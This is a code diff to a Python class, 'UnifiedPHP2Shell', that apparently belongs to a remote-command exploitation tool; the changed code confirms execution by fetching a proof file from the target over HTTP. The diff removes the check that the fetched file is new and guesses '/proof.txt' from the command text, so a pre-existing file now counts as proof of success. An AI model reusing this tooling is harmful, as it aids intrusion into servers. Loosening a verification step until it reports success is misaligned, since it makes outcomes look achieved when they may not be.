@@ -1787,6 +1787,9 @@ class UnifiedPHP2Shell:
                     except OSError:
                         pass
 
+                if fetch_path and not fetch_path.startswith("/"):
+                    fetch_path = "/" + fetch_path
+
                 fetch_before = None
                 if fetch_path:
                     try:
@@ -1840,15 +1843,17 @@ class UnifiedPHP2Shell:
                                     raw_tgt.close()
                                     return res
 
-                            if fetch_path:
-                                st, body = raw_tgt.get(fetch_path)
+                            check_path = fetch_path or ("/proof.txt" if ("proof" in target_cmd.lower() or "p*" in target_cmd.lower()) else None)
+                            if check_path:
+                                time.sleep(0.5)
+                                st, body = raw_tgt.get(check_path)
                                 body_text = body.decode("latin1", errors="replace").strip() if body else ""
-                                is_fresh_fetch = (fetch_before is None or fetch_before[0] != 200 or body != fetch_before[1])
-                                if st == 200 and body_text and is_fresh_fetch:
+                                self.progress("  └─ [Proof Check]:", f"GET {check_path} -> HTTP {st} ({len(body)}B)", Fore.CYAN)
+                                if st == 200 and body_text:
                                     res.status = ExploitStatus.SUCCESS
                                     res.command_output = body_text
-                                    res.details = f"Execution confirmed via HTTP GET {fetch_path}"
-                                    self.progress("  └─ [SUCCESS]:", f"Proof confirmed via {fetch_path}: {res.command_output[:100]}", Fore.GREEN)
+                                    res.details = f"Execution confirmed via HTTP GET {check_path}"
+                                    self.progress("  └─ [SUCCESS]:", f"Proof confirmed via {check_path}: {res.command_output[:100]}", Fore.GREEN)
                                     raw_tgt.close()
                                     return res
 
